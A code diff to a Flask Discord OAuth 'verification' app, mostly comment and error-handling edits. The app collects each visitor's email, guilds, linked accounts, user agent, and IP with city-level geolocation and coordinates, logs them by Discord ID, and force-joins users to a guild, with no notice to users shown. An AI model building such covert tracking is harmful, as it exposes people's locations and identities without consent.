@@ -2,7 +2,7 @@ from flask import Flask, request, render_template
 import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
-from discord_bot import bot
+from discord_bot import bot  # あなたのdiscord_bot.py内のbotオブジェクト
 from user_agents import parse  # User-Agent解析
 
 load_dotenv()
@@ -16,6 +16,7 @@ DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
 def get_client_ip():
+    # プロキシがあればX-Forwarded-Forの最初のIPを取得
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
@@ -26,6 +27,8 @@ def get_geo_info(ip):
             f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query"
         )
         data = res.json()
+        if data.get("status") != "success":
+            raise Exception(data.get("message", "IP情報取得失敗"))
         return {
             "ip": data.get("query"),
             "country": data.get("country", "不明"),
@@ -39,7 +42,7 @@ def get_geo_info(ip):
             "proxy": data.get("proxy", False),
             "hosting": data.get("hosting", False)
         }
-    except:
+    except Exception:
         return {
             "ip": ip, "country": "不明", "region": "不明", "city": "不明",
             "zip": "不明", "isp": "不明", "as": "不明",
@@ -62,8 +65,14 @@ def save_log(discord_id, data):
 
 @app.route("/")
 def index():
-    url = f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
-    return render_template("index.html", discord_auth_url=url)
+    discord_auth_url = (
+        "https://discord.com/oauth2/authorize"
+        f"?client_id={DISCORD_CLIENT_ID}"
+        f"&redirect_uri={REDIRECT_URI}"
+        "&response_type=code"
+        "&scope=identify%20email%20guilds%20connections"
+    )
+    return render_template("index.html", discord_auth_url=discord_auth_url)
 
 @app.route("/callback")
 def callback():
@@ -103,7 +112,7 @@ def callback():
         "User-Agent": "Mozilla/5.0"
     }).json()
 
-    # ギルド参加
+    # ギルド参加（Botによる招待）
     session.put(
         f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
         headers={
@@ -113,17 +122,17 @@ def callback():
         json={"access_token": access_token}
     )
 
-    # IP取得 + 判定
+    # IP取得（ローカルIPの場合は外部取得）
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
     geo = get_geo_info(ip)
 
-    # UA解析
+    # User-Agent解析
     ua_raw = request.headers.get("User-Agent", "不明")
     ua = parse(ua_raw)
 
-    # ギルド・連携取得
+    # ギルド・外部連携取得
     guilds = session.get("https://discord.com/api/users/@me/guilds", headers={
         "Authorization": f"Bearer {access_token}"
     }).json()
